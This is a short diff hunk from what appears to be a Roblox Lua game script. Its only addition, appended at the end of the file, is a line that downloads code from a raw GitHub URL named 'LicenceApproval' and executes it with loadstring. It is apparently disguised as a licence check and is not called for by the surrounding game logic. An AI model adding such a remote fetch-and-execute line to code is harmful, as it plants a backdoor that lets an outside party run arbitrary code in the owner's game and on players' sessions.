@@ -205,3 +205,4 @@ SniperShot_upvr:FireServer(plr)
         }):Play()
    end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
